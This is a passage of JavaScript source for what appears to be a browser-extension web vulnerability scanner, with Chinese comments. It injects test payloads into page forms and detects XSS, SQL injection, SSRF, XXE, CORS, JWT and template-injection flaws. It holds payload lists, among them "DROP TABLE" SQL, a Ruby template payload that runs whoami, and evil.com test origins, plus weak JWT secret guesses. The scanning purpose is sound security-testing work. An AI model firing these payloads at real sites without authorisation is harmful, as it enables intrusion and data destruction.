        this.xssPayloads[Math.floor(Math.random() * this.xssPayloads.length)] : 
        this.sqlInjectionPayloads[Math.floor(Math.random() * this.sqlInjectionPayloads.length)];
    }
    
    // 文本区域
    if (tagName === 'textarea') {
    return this.xssPayloads[Math.floor(Math.random() * this.xssPayloads.length)];
  }
  
    // 选择框
    if (tagName === 'select') {
      // 不修改选择框的值，因为这可能会导致表单验证失败
      return null;
    }
    
    // 按钮
    if (tagName === 'button' || (tagName === 'input' && (type === 'submit' || type === 'button'))) {
      // 不需要为按钮生成payload
      return null;
    }
    
    // 链接
    if (tagName === 'a') {
      // 不修改链接，只点击它
      return null;
    }
    
    // 默认情况：生成正常输入
    return this.generateNormalInput(element);
  }
  
  // 生成文件上传payload
  generateFilePayload() {
    return this.fileUploadPayloads[Math.floor(Math.random() * this.fileUploadPayloads.length)];
  }
  
  // 生成密码payload
  generatePasswordPayload() {
    const passwords = [
      "password123",
      "admin123",
      "test123",
      "123456",
      "qwerty",
      "' OR '1'='1",
      "admin' --"
    ];
    return passwords[Math.floor(Math.random() * passwords.length)];
  }
  
  // 生成邮箱payload
  generateEmailPayload() {
    const emails = [
      "test@example.com",
      "admin@example.com",
      "user@example.com",
      "test+xss@example.com",
      "test@example.com' OR '1'='1",
      "test@example.com<script>alert(1)</script>"
    ];
    return emails[Math.floor(Math.random() * emails.length)];
  }
  
  // 生成用户名payload
  generateUsernamePayload() {
    const usernames = [
      "admin",
      "test",
      "user",
      "admin' --",
      "admin' OR '1'='1",
      "admin<script>alert(1)</script>"
    ];
    return usernames[Math.floor(Math.random() * usernames.length)];
  }
  
  // 生成搜索payload
  generateSearchPayload() {
    const searches = [
      "test",
      "admin",
      "<script>alert('XSS Detected')</script>",
      "' OR '1'='1",
      "' UNION SELECT 1,2,3 --"
    ];
    return searches[Math.floor(Math.random() * searches.length)];
  }
  
  // 生成URL payload
  generateUrlPayload() {
    // 有50%的概率使用正常URL，50%的概率使用SSRF载荷
    if (Math.random() < 0.5) {
      return this.getRandomItem([
        'https://example.com',
        'https://google.com',
        'https://github.com',
        'https://microsoft.com'
      ]);
    } else {
      return this.getRandomItem(this.ssrfPayloads);
    }
  }
  
  // 生成电话号码payload
  generatePhonePayload() {
    const phones = [
      "13800138000",
      "13900139000",
      "13700137000",
      "13600136000",
      "13500135000"
    ];
    return phones[Math.floor(Math.random() * phones.length)];
  }
  
  // 生成数字payload
  generateNumberPayload() {
    const numbers = [
      "123",
      "0",
      "-1",
      "999999",
      "1e9",
      "1' OR '1'='1"
    ];
    return numbers[Math.floor(Math.random() * numbers.length)];
  }
  
  // 生成日期payload
  generateDatePayload() {
    const dates = [
      "2023-01-01",
      "2000-01-01",
      "2099-12-31",
      "1970-01-01",
      "2023-02-30" // 无效日期
    ];
    return dates[Math.floor(Math.random() * dates.length)];
  }
  
  // 生成正常输入
  generateNormalInput(element) {
    const type = (element.type || '').toLowerCase();
    const name = (element.name || '').toLowerCase();
    const id = (element.id || '').toLowerCase();
    
    // 根据字段名称生成合适的输入
    
    // 邮箱字段
    if (type === 'email' || name.includes('email') || id.includes('email')) {
      return "test@example.com";
    }
    
    // 密码字段
    if (type === 'password' || name.includes('pass') || id.includes('pass')) {
      return "Password123!";
    }
    
    // 电话字段
    if (type === 'tel' || name.includes('phone') || id.includes('phone') || 
        name.includes('mobile') || id.includes('mobile')) {
      return "13800138000";
    }
    
    // 名字字段
    if (name.includes('name') || id.includes('name')) {
      const names = ['张三', '李四', '王五', 'John Doe', 'Jane Smith'];
      return names[Math.floor(Math.random() * names.length)];
    }
    
    // 随机选择通用输入
    return this.normalInputs[Math.floor(Math.random() * this.normalInputs.length)];
  }
  
  // 生成XML测试载荷
  generateXmlPayload() {
    // 有30%的概率使用正常XML，70%的概率使用XXE载荷
    if (Math.random() < 0.3) {
      return '<?xml version="1.0"?><root><element>test</element></root>';
    } else {
      return this.getRandomItem(this.xxePayloads);
    }
  }
  
  // 生成模板测试载荷
  generateTemplatePayload() {
    return this.getRandomItem(this.sstiPayloads);
  }
  
  // 生成命令测试载荷
  generateCommandPayload() {
    return this.getRandomItem(this.commandInjectionPayloads);
  }
  
  // 生成路径测试载荷
  generatePathPayload() {
    return this.getRandomItem(this.pathTraversalPayloads);
  }
  
  // 生成序列化对象测试载荷
  generateSerializedPayload() {
    return this.getRandomItem(this.deserializationPayloads);
  }
  
  // 从数组中随机选择一项
  getRandomItem(array) {
    return array[Math.floor(Math.random() * array.length)];
  }
}

class VulnerabilityDetector {
  constructor() {
    this.foundVulnerabilities = [];
    this.xssPayloads = [
      '<script>alert("XSS Detected")</script>',
      '"><script>alert("XSS Detected")</script>',
      '"><img src=x onerror="alert(\'XSS Detected\')">',
      '\' onmouseover=\'alert("XSS Detected")\'',
      '";alert("XSS Detected");//',
      '<div data-xss-test="1">XSS Test</div>',
      '"><svg/onload=alert("XSS Detected")>',
      '\'><iframe/srcdoc="<script>alert(\'XSS Detected\')</script>">',
      'javascript:alert("XSS Detected")'
    ];
    this.sqlInjectionPayloads = [
      "' OR '1'='1",
      "' OR '1'='1' --",
      "admin' --",
      "1' OR '1' = '1",
      "' UNION SELECT 1,2,3 --",
      "'; DROP TABLE users; --",
      "1'; SELECT * FROM information_schema.tables; --",
      "' OR 1=1 #",
      "') OR ('1'='1",
      "' OR 1=1 LIMIT 1; --"
    ];
    this.sensitivePatterns = [
      /[0-9]{16,19}/g, // 信用卡号
      /[0-9]{3}-[0-9]{2}-[0-9]{4}/g, // 美国社会安全号
      /[0-9]{18}|[0-9]{17}X/g, // 中国身份证号
      /[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}/g, // 邮箱地址
      /[0-9]{11}/g // 中国手机号
    ];
    
    // 添加新的漏洞类型
    this.vulnerabilityTypes = [
      'XSS',
      'SQL Injection',
      'CSRF',
      'Sensitive Information Leakage',
      'Insecure Headers',
      'Directory Traversal',
      'SSRF',
      'XXE',
      'CORS Misconfiguration',
      'JWT Weakness',
      'Open Redirect',
      'HTTP Parameter Pollution',
      'Server-Side Template Injection'
    ];
    
    // JWT相关
    this.commonJwtSecrets = [
      'secret',
      'private',
      'key',
      'password',
      '1234567890',
      'qwertyuiop',
      'abcdef',
      'jwt_secret',
      'jwt_token',
      'auth',
      'authentication',
      'secret_key',
      'api_secret',
      'app_secret',
      'app_key',
      'encryption_key'
    ];
    
    // CORS测试
    this.corsTestOrigins = [
      'https://evil.com',
      'https://attacker.com',
      'null'
    ];
    
    // 服务器端模板注入测试
    this.sstiPayloads = {
      'generic': ['${7*7}', '{{7*7}}', '<%= 7*7 %>', '#{7*7}', '${{7*7}}', '#{7*7}'],
      'php': ['<?php echo(7*7); ?>', '<?= 7*7 ?>'],
      'java': ['${T(java.lang.Runtime).getRuntime()}', '${T(java.lang.System).getenv()}'],
      'python': ['{% for x in ().__class__.__base__.__subclasses__() %}{{x}}{% endfor %}', '{{7*7}}'],
      'ruby': ['<%= 7*7 %>', '<%= system("whoami") %>'],
      'node': ['<%= process.env %>', '${process.env}', '#{process.env}']
    };
    
    // 初始化网络请求监听
    this.initNetworkMonitoring();
  }
  
  // 初始化网络请求监听
  initNetworkMonitoring() {
    // 使用Performance API监控网络请求
    const observer = new PerformanceObserver((list) => {
      list.getEntries().forEach(entry => {
        // 只处理资源加载
        if (entry.entryType === 'resource') {
          this.analyzeNetworkRequest(entry);
        }
      });
    });
    
    // 开始观察资源加载
    observer.observe({ entryTypes: ['resource'] });
    
    // 拦截XMLHttpRequest
    this.interceptXHR();
    
    // 拦截Fetch API
    this.interceptFetch();
  }
  
  // 拦截XMLHttpRequest
  interceptXHR() {
    const originalOpen = XMLHttpRequest.prototype.open;
    const originalSend = XMLHttpRequest.prototype.send;
    const self = this;
    
    XMLHttpRequest.prototype.open = function(method, url, async, user, password) {
      this._url = url;
      this._method = method;
      return originalOpen.apply(this, arguments);
    };
    
    XMLHttpRequest.prototype.send = function(body) {
      // 检查请求是否可能导致SSRF
      self.checkForSSRF(this._url, this._method, body);
      
      // 检查JWT
      if (body && typeof body === 'string') {
        self.checkForJWTWeakness(body);
      }
      
      // 添加响应处理
      this.addEventListener('load', function() {
        // 检查响应中的漏洞
        self.analyzeResponse(this);
      });
      
      return originalSend.apply(this, arguments);
    };
  }
  
  // 拦截Fetch API
  interceptFetch() {
    const originalFetch = window.fetch;
    const self = this;
    
    window.fetch = function(resource, init) {
      let url = resource;
      if (typeof resource === 'object' && resource.url) {
        url = resource.url;
      }
      
      const method = init && init.method ? init.method : 'GET';
      const body = init && init.body ? init.body : null;
      
      // 检查请求是否可能导致SSRF
      self.checkForSSRF(url, method, body);
      
      // 检查JWT
      if (body && typeof body === 'string') {
        self.checkForJWTWeakness(body);
      }
      
      // 检查请求头中的JWT
      if (init && init.headers) {
        const headers = new Headers(init.headers);
        const authHeader = headers.get('Authorization');
        if (authHeader && authHeader.startsWith('Bearer ')) {
          const token = authHeader.split(' ')[1];
          self.checkForJWTWeakness(token);
        }
      }
      
      return originalFetch.apply(this, arguments)
        .then(response => {
          // 克隆响应以便可以读取内容
          const clonedResponse = response.clone();
          
          // 检查CORS配置
          self.checkForCORSMisconfiguration(clonedResponse);
          
          // 分析响应
          clonedResponse.text().then(text => {
            self.analyzeResponseText(text, url);
          });
          
          return response;
        });
    };
  }
  
  // 分析网络请求
  analyzeNetworkRequest(entry) {
    // 检查URL是否包含敏感参数
    const url = new URL(entry.name);
    const params = url.searchParams;
    
    // 检查开放重定向
    this.checkForOpenRedirect(url);
    
    // 检查HTTP参数污染
    this.checkForParameterPollution(params);
    
    // 检查SSRF
    this.checkForSSRF(entry.name, null, null);
  }
  
  // 分析响应
  analyzeResponse(xhr) {
    // 检查CORS配置
    this.checkForCORSMisconfiguration(xhr);
    
    // 分析响应内容
    if (xhr.responseText) {
      this.analyzeResponseText(xhr.responseText, xhr._url);
    }
  }
  
  // 分析响应文本
  analyzeResponseText(text, url) {
    // 检查XXE漏洞的迹象
    this.checkForXXE(text);
    
    // 检查服务器端模板注入
    this.checkForSST(text);
    
    // 检查敏感信息泄露
    this.checkForSensitiveInfo(text, url);
    
    // 检查JWT
    this.extractAndCheckJWT(text);
  }
  
  // 检测漏洞
  detectVulnerabilities(previousState) {
    // 检测XSS
    this.detectXSS();
    
    // 检测SQL注入
    this.detectSQLInjection(previousState);
    
    // 检测CSRF
    this.detectCSRF();
    
    // 检测敏感信息泄露
    this.detectSensitiveInfoLeakage();
    
    // 检测不安全的HTTP头部
    this.detectInsecureHeaders();
    
    // 检测目录遍历
    this.detectDirectoryTraversal();
    
    // 添加新的漏洞检测
    this.detectSSRF();
    this.detectXXE();
    this.detectCORSMisconfiguration();
    this.detectJWTWeakness();
    this.detectOpenRedirect();
    this.detectParameterPollution();
    this.detectServerSideTemplateInjection();
    
    return this.foundVulnerabilities;
  }
  
  // 检测XSS
  detectXSS() {
    // 查找是否有JS执行痕迹
    const xssSignatures = [
      'XSS Detected',
      'alert(',
      'console.log(',
      'onerror',
      'onmouseover',
      'javascript:',
      'document.cookie'
    ];
    
    // 检查页面源代码
    const pageSource = document.documentElement.outerHTML;
    for (const signature of xssSignatures) {
      if (pageSource.includes(signature)) {
        this.recordVulnerability('XSS', {
          evidence: signature,
          location: window.location.href,
          severity: 'High',
          description: '检测到跨站脚本(XSS)漏洞，可能允许攻击者在用户浏览器中执行恶意脚本。'
        });
        break;
      }
    }
    
    // 检查DOM中是否有我们的XSS测试代码被执行
    const testElements = document.querySelectorAll('[data-xss-test]');
    if (testElements.length > 0) {
      this.recordVulnerability('DOM-based XSS', {
        evidence: 'XSS测试元素被成功注入到DOM中',
        location: window.location.href,
        severity: 'High',
        description: '检测到基于DOM的XSS漏洞，页面动态生成的内容没有正确过滤用户输入。'
      });
    }
  }
  
  // 检测SQL注入
  detectSQLInjection(previousState) {
    // 检查SQL错误消息
    const sqlErrorSignatures = [
      'SQL syntax',
      'mysql_',
      'ORA-',
      'syntax error',
      'ODBC Driver',
      'PostgreSQL',
      'SQLite3',
      'Microsoft SQL Server',
      'MySQL',
      'Oracle',
      'Warning: mysql_',
      'unclosed quotation mark',
      'Division by zero',
      'supplied argument is not a valid MySQL',
      'Microsoft OLE DB Provider for SQL Server',
      'Error Executing Database Query'
    ];
    
    const pageSource = document.documentElement.outerHTML;
    for (const signature of sqlErrorSignatures) {
      if (pageSource.includes(signature)) {
        this.recordVulnerability('SQL Injection', {
          evidence: signature,
          location: window.location.href,
          severity: 'Critical',
          description: '检测到SQL注入漏洞，网站可能容易受到数据库攻击。'
        });
        break;
      }
    }
    
    // 检查页面内容变化
    if (previousState && previousState.html) {
      // 如果页面内容在使用SQL注入payload后发生显著变化，可能存在漏洞
      const currentHtml = document.documentElement.outerHTML;
      const contentDifference = this.calculateContentDifference(previousState.html, currentHtml);
      
      if (contentDifference > 0.5 && window.location.href.includes("'")) {
        this.recordVulnerability('Potential SQL Injection', {
          evidence: '页面内容在使用SQL注入测试后发生显著变化',
          location: window.location.href,
          severity: 'Medium',
          description: '在使用SQL注入测试参数后，页面内容发生了显著变化，可能存在SQL注入漏洞。'
        });
      }
    }
  }
  
  // 计算两个HTML字符串的差异程度 (0-1)
  calculateContentDifference(html1, html2) {
    // 简单实现：移除所有HTML标签，比较文本内容
    const text1 = html1.replace(/<[^>]*>/g, '').trim();
    const text2 = html2.replace(/<[^>]*>/g, '').trim();
    
    // 使用Levenshtein距离计算相似度
    const distance = this.levenshteinDistance(text1, text2);
    const maxLength = Math.max(text1.length, text2.length);
    
    return distance / maxLength;
  }
  
  // Levenshtein距离算法
  levenshteinDistance(s1, s2) {
    // 为了效率，只使用前1000个字符
    s1 = s1.substring(0, 1000);
    s2 = s2.substring(0, 1000);
    
    const m = s1.length;
    const n = s2.length;
    
    // 创建距离矩阵
    const d = Array(m + 1).fill().map(() => Array(n + 1).fill(0));
    
    // 初始化第一行和第一列
    for (let i = 0; i <= m; i++) d[i][0] = i;
    for (let j = 0; j <= n; j++) d[0][j] = j;
    
    // 填充矩阵
    for (let i = 1; i <= m; i++) {
      for (let j = 1; j <= n; j++) {
        const cost = s1[i - 1] === s2[j - 1] ? 0 : 1;
        d[i][j] = Math.min(
          d[i - 1][j] + 1,      // 删除
          d[i][j - 1] + 1,      // 插入
          d[i - 1][j - 1] + cost // 替换
        );
      }
    }
    
    return d[m][n];
  }
  
  // 检测CSRF
  detectCSRF() {
    // 检查表单是否缺少CSRF令牌
    const forms = document.querySelectorAll('form');
    
    forms.forEach(form => {
      // 只检查非GET方法的表单
      const method = (form.method || 'GET').toUpperCase();
      if (method === 'GET') return;
      
      let hasCSRFToken = false;
      
      // 查找常见的CSRF令牌
      const inputs = form.querySelectorAll('input[type="hidden"]');
      inputs.forEach(input => {
        const name = (input.name || '').toLowerCase();
        if (name.includes('csrf') || name.includes('token') || name.includes('nonce')) {
          hasCSRFToken = true;
        }
      });
      
      // 检查请求头中是否有CSRF保护
      const headers = form.dataset.headers || '';
      if (headers.toLowerCase().includes('x-csrf') || headers.toLowerCase().includes('x-xsrf')) {
        hasCSRFToken = true;
      }
      
      if (!hasCSRFToken) {
        this.recordVulnerability('CSRF', {
          evidence: `表单缺少CSRF保护: ${form.action || window.location.href}`,
          location: window.location.href,
          severity: 'Medium',
          description: '检测到跨站请求伪造(CSRF)漏洞，表单缺少CSRF令牌保护。'
        });
      }
    });
  }
  
  // 检测敏感信息泄露
  detectSensitiveInfoLeakage() {
    const pageSource = document.documentElement.outerHTML;
    
    // 检查敏感信息模式
    this.sensitivePatterns.forEach((pattern, index) => {
      const matches = pageSource.match(pattern);
      if (matches && matches.length > 0) {
        let type = '未知敏感信息';
        switch(index) {
          case 0: type = '可能的信用卡号'; break;
          case 1: type = '可能的社会安全号'; break;
          case 2: type = '可能的身份证号'; break;
          case 3: type = '电子邮件地址'; break;
          case 4: type = '可能的手机号'; break;
        }
        
        this.recordVulnerability('敏感信息泄露', {
          evidence: `发现${matches.length}个${type}`,
          location: window.location.href,
          severity: 'Medium',
          description: `页面中存在敏感信息泄露，包括${type}。`
        });
      }
    });
    
    // 检查注释中的敏感信息
    const commentRegex = /<!--[\s\S]*?-->/g;
    const comments = pageSource.match(commentRegex);
    
    if (comments) {
      const sensitiveCommentPatterns = [
        /password/i, /密码/i, /api[_\s]?key/i, /secret/i, 
        /token/i, /用户名/i, /username/i, /database/i, 
        /连接/i, /connection/i, /todo/i, /fixme/i
      ];
      
      comments.forEach(comment => {
        for (const pattern of sensitiveCommentPatterns) {
          if (pattern.test(comment)) {
            this.recordVulnerability('注释中的敏感信息', {
              evidence: comment.substring(0, 100) + (comment.length > 100 ? '...' : ''),
              location: window.location.href,
              severity: 'Low',
              description: '在HTML注释中发现可能的敏感信息。'
            });
            break;
          }
        }
      });
    }
  }
  
  // 检测不安全的HTTP头部
  detectInsecureHeaders() {
    // 这个方法需要在background.js中实现，因为content script无法访问响应头
    // 这里只是一个占位符
  }
  
  // 检测目录遍历
  detectDirectoryTraversal() {
    // 检查URL中是否包含目录遍历尝试的痕迹
    const url = window.location.href;
    const directoryTraversalPatterns = [
      '../', '..%2f', '%2e%2e%2f', '..\\', '..%5c', '%2e%2e%5c'
    ];
    
    for (const pattern of directoryTraversalPatterns) {
      if (url.includes(pattern)) {
        // 检查页面内容是否显示了文件列表或系统路径
        const pageSource = document.documentElement.outerHTML;
        const fileListingPatterns = [
          /Index of \//, /Directory listing for/, /Parent Directory/,
          /drwxr-xr-x/, /<dir>/, /文件列表/, /目录/
        ];
        
        for (const filePattern of fileListingPatterns) {
          if (filePattern.test(pageSource)) {
            this.recordVulnerability('目录遍历', {
              evidence: `URL包含${pattern}且页面显示目录列表`,
              location: url,
              severity: 'High',
              description: '检测到目录遍历漏洞，攻击者可能能够访问服务器上的敏感文件。'
            });
            return; // 找到一个就退出
          }
        }
      }
    }
  }
  
  // 检测SSRF漏洞
  detectSSRF() {
    // 这个方法在请求发送时通过checkForSSRF实时检测
  }
  
  // 检查SSRF漏洞
  checkForSSRF(url, method, body) {
    try {
      // 解析URL
      const parsedUrl = new URL(url, window.location.href);
      
      // 检查是否包含内部IP地址
      const hostname = parsedUrl.hostname;
      
      // 检查是否是内部IP
      if (this.isInternalIP(hostname)) {
        this.recordVulnerability('SSRF', {
          evidence: `请求发送到内部IP地址: ${hostname}`,
          location: window.location.href,
          severity: 'High',
          description: '服务器端请求伪造(SSRF)漏洞可能存在，应用程序尝试访问内部IP地址。'
        });
        return;
      }
      
      // 检查URL参数中是否包含URL
      const params = parsedUrl.searchParams;
      for (const [key, value] of params.entries()) {
        if (this.looksLikeUrl(value)) {
          this.recordVulnerability('SSRF', {
            evidence: `URL参数包含另一个URL: ${key}=${value}`,
            location: window.location.href,
            severity: 'Medium',
            description: '可能存在SSRF漏洞，URL参数中包含指向内部资源的URL。'
          });
          return;
        }
      }
      
      // 检查请求体中是否包含URL
      if (body && typeof body === 'string') {
        // 尝试解析JSON
        try {
          const jsonBody = JSON.parse(body);
          this.checkObjectForUrls(jsonBody);
        } catch (e) {
          // 不是JSON，检查字符串中的URL
          const urlRegex = /(https?:\/\/[^\s"']+)/g;
          const matches = body.match(urlRegex);
          if (matches) {
            for (const match of matches) {
              if (this.isInternalIP(new URL(match).hostname)) {
                this.recordVulnerability('SSRF', {
                  evidence: `请求体中包含内部URL: ${match}`,
                  location: window.location.href,
                  severity: 'High',
                  description: '服务器端请求伪造(SSRF)漏洞可能存在，请求体中包含指向内部资源的URL。'
                });
                return;
              }
            }
          }
        }
      }
    } catch (e) {
      // 忽略URL解析错误
    }
  }
  
  // 递归检查对象中的URL
  checkObjectForUrls(obj, path = '') {
    if (!obj || typeof obj !== 'object') return;
    
    for (const [key, value] of Object.entries(obj)) {
      const currentPath = path ? `${path}.${key}` : key;
      
      if (typeof value === 'string' && this.looksLikeUrl(value)) {
        try {
          const url = new URL(value);
          if (this.isInternalIP(url.hostname)) {
            this.recordVulnerability('SSRF', {
              evidence: `JSON中包含内部URL: ${currentPath}=${value}`,
              location: window.location.href,
              severity: 'High',
              description: '服务器端请求伪造(SSRF)漏洞可能存在，JSON数据中包含指向内部资源的URL。'
            });
          }
        } catch (e) {
          // 忽略URL解析错误
        }
      } else if (typeof value === 'object') {
        this.checkObjectForUrls(value, currentPath);
      }
    }
  }
  
  // 检查字符串是否像URL
  looksLikeUrl(str) {
    return /^https?:\/\//.test(str);
  }
  
  // 检查是否是内部IP
  isInternalIP(hostname) {
    // 检查localhost
    if (hostname === 'localhost' || hostname === '127.0.0.1' || hostname === '::1') {
      return true;
    }
    
    // 检查私有IP范围
    const privateRanges = [
      /^10\.\d{1,3}\.\d{1,3}\.\d{1,3}$/,  // 10.0.0.0 - 10.255.255.255
      /^172\.(1[6-9]|2\d|3[0-1])\.\d{1,3}\.\d{1,3}$/,  // 172.16.0.0 - 172.31.255.255
      /^192\.168\.\d{1,3}\.\d{1,3}$/,  // 192.168.0.0 - 192.168.255.255
      /^169\.254\.\d{1,3}\.\d{1,3}$/,  // 169.254.0.0 - 169.254.255.255
      /^127\.\d{1,3}\.\d{1,3}\.\d{1,3}$/  // 127.0.0.0 - 127.255.255.255
    ];
    
    return privateRanges.some(range => range.test(hostname));
  }
  
  // 检测XXE漏洞
  detectXXE() {
    // 这个方法在响应接收时通过checkForXXE实时检测
  }
  
  // 检查XXE漏洞
  checkForXXE(responseText) {
    // 检查XML解析错误消息
    const xxeErrorPatterns = [
      /entity.*not.*found/i,
      /undefine.*entity/i,
      /undefine.*dtd/i,
      /invalid.*entity/i,
      /invalid.*dtd/i,
      /failed.*load.*external.*entity/i,
      /external.*entity/i
    ];
    
    for (const pattern of xxeErrorPatterns) {
      if (pattern.test(responseText)) {
        this.recordVulnerability('XXE', {
          evidence: `响应中包含可能的XXE错误: ${responseText.match(pattern)[0]}`,
          location: window.location.href,
          severity: 'High',
          description: '可能存在XML外部实体(XXE)漏洞，响应中包含XML解析错误。'
        });
        return;
      }
    }
    
    // 检查是否包含XML内容
    if (responseText.includes('<?xml') || responseText.includes('<!DOCTYPE')) {
      // 检查是否包含敏感系统文件内容
      const systemFilePatterns = [
        /root:.*:\/bin\/bash/,  // /etc/passwd
        /DOCUMENT_ROOT/i,       // Apache配置
        /java\.io\.FileNotFoundException/i,  // Java错误
        /ftp:\/\/|file:\/\//i   // 文件协议
      ];
      
      for (const pattern of systemFilePatterns) {
        if (pattern.test(responseText)) {
          this.recordVulnerability('XXE', {
            evidence: `响应中包含可能通过XXE泄露的系统文件内容: ${responseText.match(pattern)[0]}`,
            location: window.location.href,
            severity: 'Critical',
            description: '可能存在XML外部实体(XXE)漏洞，响应中包含系统文件内容。'
          });
          return;
        }
      }
    }
  }
  
  // 检测CORS配置错误
  detectCORSMisconfiguration() {
    // 这个方法在响应接收时通过checkForCORSMisconfiguration实时检测
  }
  
  // 检查CORS配置错误
  checkForCORSMisconfiguration(response) {
    // 获取CORS相关响应头
    let accessControlAllowOrigin;
    let accessControlAllowCredentials;
    
    if (response instanceof XMLHttpRequest) {
      accessControlAllowOrigin = response.getResponseHeader('Access-Control-Allow-Origin');
      accessControlAllowCredentials = response.getResponseHeader('Access-Control-Allow-Credentials');
    } else if (response instanceof Response) {
      accessControlAllowOrigin = response.headers.get('Access-Control-Allow-Origin');
      accessControlAllowCredentials = response.headers.get('Access-Control-Allow-Credentials');
    } else {
      return;
    }
    
    // 检查是否存在宽松的CORS配置
    if (accessControlAllowOrigin === '*' && accessControlAllowCredentials === 'true') {
      this.recordVulnerability('CORS Misconfiguration', {
        evidence: `Access-Control-Allow-Origin: ${accessControlAllowOrigin}, Access-Control-Allow-Credentials: ${accessControlAllowCredentials}`,
        location: window.location.href,
        severity: 'High',
        description: 'CORS配置错误：同时设置Access-Control-Allow-Origin为*和Access-Control-Allow-Credentials为true是不安全的。'
      });
      return;
    }
    
    // 检查是否反射Origin头
    if (accessControlAllowOrigin && accessControlAllowOrigin !== '*' && accessControlAllowOrigin !== window.location.origin) {
      // 检查是否包含子域
      if (accessControlAllowOrigin.includes(window.location.hostname.replace(/^www\./, ''))) {
        // 可能是合法的子域配置
        return;
      }
      
      this.recordVulnerability('CORS Misconfiguration', {
        evidence: `Access-Control-Allow-Origin: ${accessControlAllowOrigin}`,
        location: window.location.href,
        severity: 'Medium',
        description: 'CORS配置可能存在问题：服务器可能反射Origin头，允许任意来源的跨域请求。'
      });
    }
  }
  
  // 检测JWT弱点
  detectJWTWeakness() {
    // 这个方法在请求发送和响应接收时通过checkForJWTWeakness实时检测
  }
  
  // 从文本中提取并检查JWT
  extractAndCheckJWT(text) {
    // JWT格式: xxxxx.yyyyy.zzzzz
    const jwtRegex = /eyJ[a-zA-Z0-9_-]+\.eyJ[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+/g;
    const matches = text.match(jwtRegex);
    
    if (matches) {
      for (const jwt of matches) {
        this.checkForJWTWeakness(jwt);
      }
    }
  }
  
  // 检查JWT弱点
  checkForJWTWeakness(token) {
    if (!token || typeof token !== 'string') return;
    
    // 查找JWT格式的令牌
    const jwtRegex = /eyJ[a-zA-Z0-9_-]+\.eyJ[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+/;
    const match = token.match(jwtRegex);
    
    if (!match) return;
    
    const jwt = match[0];
    
    // 解析JWT
    try {
      const parts = jwt.split('.');
      if (parts.length !== 3) return;
      
      // 解码头部
      const header = JSON.parse(atob(parts[0]));
      
      // 检查算法
      if (header.alg === 'none') {
        this.recordVulnerability('JWT Weakness', {
          evidence: `JWT使用了'none'算法: ${jwt.substring(0, 20)}...`,
          location: window.location.href,
          severity: 'Critical',
          description: 'JWT使用了不安全的"none"算法，攻击者可以伪造令牌。'
        });
        return;
      }
      
      if (header.alg === 'HS256') {
        // 检查是否使用了弱密钥
        // 注意：在客户端无法直接检查密钥强度，但可以检查令牌长度
        if (parts[2].length < 32) {
          this.recordVulnerability('JWT Weakness', {
            evidence: `JWT签名部分长度较短: ${jwt.substring(0, 20)}...`,
            location: window.location.href,
            severity: 'Medium',
            description: 'JWT签名部分长度较短，可能使用了弱密钥。'
          });
        }
      }
      
      // 解码载荷
      const payload = JSON.parse(atob(parts[1]));
      
      // 检查过期时间
      if (!payload.exp) {
        this.recordVulnerability('JWT Weakness', {
          evidence: `JWT没有过期时间: ${jwt.substring(0, 20)}...`,
          location: window.location.href,
          severity: 'Medium',
          description: 'JWT没有设置过期时间(exp)，这可能导致令牌永久有效。'
        });
      } else {
        // 检查是否已过期但仍在使用
        const expTime = payload.exp * 1000; // 转换为毫秒
        if (expTime < Date.now()) {
          this.recordVulnerability('JWT Weakness', {
            evidence: `使用了过期的JWT: ${jwt.substring(0, 20)}...`,
            location: window.location.href,
            severity: 'Low',
            description: '应用程序使用了已过期的JWT，这表明可能存在令牌验证问题。'
          });
        }
      }
    } catch (e) {
      // 解析错误，可能不是有效的JWT
    }
  }
  
  // 检测开放重定向
  detectOpenRedirect() {
    // 这个方法在请求发送时通过checkForOpenRedirect实时检测
  }
  
  // 检查开放重定向
  checkForOpenRedirect(url) {
    // 检查URL参数中是否包含重定向URL
    const params = url.searchParams;
    const redirectParams = [
      'redirect', 'redirect_uri', 'redirect_url', 'return', 'return_to',
      'returnTo', 'return_path', 'returnUrl', 'goto', 'next', 'redir',
      'redirect_to', 'destination', 'continue', 'url', 'target', 'link'
    ];
    
    for (const param of redirectParams) {
      if (params.has(param)) {
        const redirectUrl = params.get(param);
        
        // 检查是否是外部URL
        if (this.isExternalUrl(redirectUrl, url.origin)) {
          this.recordVulnerability('Open Redirect', {
            evidence: `URL参数包含外部重定向: ${param}=${redirectUrl}`,
            location: window.location.href,
            severity: 'Medium',
            description: '可能存在开放重定向漏洞，URL参数中包含指向外部域的重定向URL。'
          });
          return;
        }
      }
    }
  }
  
  // 检查是否是外部URL
  isExternalUrl(url, origin) {
    // 检查是否是相对URL
    if (url.startsWith('/') && !url.startsWith('//')) {
      return false;
    }
    
    try {
      // 尝试解析URL
      const parsedUrl = new URL(url, origin);
      return parsedUrl.origin !== origin;
    } catch (e) {
      // 无法解析URL，可能是相对路径
      return false;
    }
  }
  
  // 检测HTTP参数污染
  detectParameterPollution() {
    // 这个方法在请求发送时通过checkForParameterPollution实时检测
  }
  
  // 检查HTTP参数污染
  checkForParameterPollution(params) {
    // 检查是否有重复的参数名
    const paramNames = new Set();
    const duplicateParams = new Set();
    
    for (const [name, value] of params.entries()) {
      if (paramNames.has(name)) {
        duplicateParams.add(name);
      } else {
        paramNames.add(name);
      }
    }
    
    if (duplicateParams.size > 0) {
      this.recordVulnerability('HTTP Parameter Pollution', {
        evidence: `URL包含重复的参数: ${Array.from(duplicateParams).join(', ')}`,
        location: window.location.href,
        severity: 'Medium',
        description: '可能存在HTTP参数污染漏洞，URL中包含重复的参数名。'
      });
    }
  }
  
  // 检测服务器端模板注入
  detectServerSideTemplateInjection() {
    // 这个方法在响应接收时通过checkForSST实时检测
  }
  
  // 检查服务器端模板注入
  checkForSST(responseText) {
    // 检查数学运算结果
    const mathResults = [
      '49', // 7*7
      '14', // 7+7
      '77', // 字符串连接
    ];
    
    for (const result of mathResults) {
      if (responseText.includes(result)) {
        // 进一步检查是否是模板注入的结果
        const context = this.getTextContext(responseText, result);
        
        // 检查上下文是否包含模板语法
        const templateSyntax = [
          '${', '{{', '<%', '#{', '${{', '#{', '<#'
        ];
        
        for (const syntax of templateSyntax) {
          if (context.includes(syntax)) {
            this.recordVulnerability('Server-Side Template Injection', {
              evidence: `响应中包含可能的模板注入结果: ${context}`,
              location: window.location.href,
              severity: 'High',
              description: '可能存在服务器端模板注入(SSTI)漏洞，响应中包含模板表达式的执行结果。'
            });
            return;
          }
        }
      }
    }
    
    // 检查特定模板引擎的错误消息
